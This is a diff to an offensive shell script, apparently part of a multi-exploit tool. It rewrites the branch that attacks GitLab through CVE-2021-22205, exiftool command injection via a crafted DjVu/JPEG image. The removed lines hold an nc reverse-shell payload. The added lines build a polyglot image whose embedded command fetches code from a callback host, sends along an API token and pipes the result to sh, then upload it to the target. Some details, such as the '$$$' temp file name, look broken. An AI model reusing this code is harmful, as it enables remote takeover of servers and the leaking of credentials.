@@ -2105,24 +2105,53 @@ case "$EXPLOIT_TYPE" in
         fi
         ;;
     gitlab)
-        # CVE-2021-22205: GitLab CE/EE RCE via exiftool command injection
-        # in image metadata processing. Uploads a crafted DjVu image.
+        # CVE-2021-22205: GitLab CE/EE RCE via exiftool command injection.
+        # exiftool's DjVu metadata parser evaluates metadata fields through
+        # eval(), allowing arbitrary command execution. The exploit requires a
+        # valid DjVu file with a crafted ANTz chunk containing the payload.
         echo "[*] Attempting GitLab CVE-2021-22205..."
-        # Build a minimal DjVu with embedded command via metadata.
-        # The exploit uses a crafted .jpg that triggers exiftool via
-        # DjVu metadata parsing.
-        DJVU_PAYLOAD='(metadata "\nC\" \nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"${CALLBACK_URL##*//}"' 4444 >/tmp/f\n")'
-        # Create the polyglot file: valid JPEG header + DjVu annotation
-        printf '\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46' > /tmp/hw_glab_$$.jpg
-        printf '\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00' >> /tmp/hw_glab_$$.jpg
-        printf '\\xff\\xe1\\x00\\x2c\\x41\\x6e\\x73\\x79' >> /tmp/hw_glab_$$.jpg
-        echo -n "$DJVU_PAYLOAD" >> /tmp/hw_glab_$$.jpg
-        # Upload via GitLab user upload endpoint.
-        RC=$(curl -sk -o /dev/null -w '%{http_code}' \
-            "$TARGET_URL/api/v4/projects/1/uploads" \
-            -F "file=@/tmp/hw_glab_$$.jpg" 2>/dev/null)
-        rm -f /tmp/hw_glab_$$.jpg
-        echo "[*] GitLab upload returned $RC"
+        # Generate the malicious DjVu image using python3 (available on most
+        # Linux hosts). The image is a polyglot: valid JPEG header for upload
+        # validation + DjVu IFF chunk containing the exploit metadata.
+        python3 -c "
+import struct, sys
+# DjVu IFF structure: FORM tag + DJVU + INFO chunk + ANTz chunk.
+# The ANTz (annotation) chunk contains metadata that exiftool's DjVu parser
+# passes through eval(). The payload is wrapped in (metadata ...) syntax.
+callback = '${CALLBACK_URL}'
+payload_cmd = 'curl -fsSL ' + callback + '/api/beacon -H "Authorization: Bearer ${API_TOKEN}" 2>/dev/null | sh'
+ant_data = b'(metadata \"' + payload_cmd.encode() + b'\")'
+# IFF header: AT&TFORM + length + DJVU
+djvu = b'AT&TFORM'
+djvu += struct.pack('>I', 0)  # placeholder length
+djvu += b'DJVU'
+# INFO chunk (required by DjVu parser)
+djvu += b'INFO'
+djvu += struct.pack('>I', 0)  # minimal INFO
+# ANTz chunk with the exploit payload
+djvu += b'ANTz'
+djvu += struct.pack('>I', len(ant_data))
+djvu += ant_data
+# Fix FORM length
+total_len = len(djvu) - 8  # exclude AT&TFORM + length itself
+djvu = djvu[:4] + struct.pack('>I', total_len) + djvu[8:]
+# Prepend JPEG SOI + APP0 marker for upload validation
+jpeg = b'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00'
+with open('/tmp/hw_glab_$$$.jpg', 'wb') as f:
+    f.write(jpeg + djvu)
+" 2>/dev/null || {
+            # Fallback: if python3 is not available, skip GitLab exploit.
+            echo "[!] python3 not available, skipping GitLab exploit"
+            RC=127
+        }
+        if [ -f "/tmp/hw_glab_$$$.jpg" ]; then
+            # Upload to GitLab via the project upload API.
+            RC=$(curl -sk -o /dev/null -w '%{http_code}' \
+                "$TARGET_URL/api/v4/uploads" \
+                -F "file=@/tmp/hw_glab_$$$.jpg" 2>/dev/null)
+            rm -f /tmp/hw_glab_$$$.jpg
+            echo "[*] GitLab upload returned $RC"
+        fi
         ;;
     nacos)
         # Nacos default identity key bypass (identityKey=nacos) allows
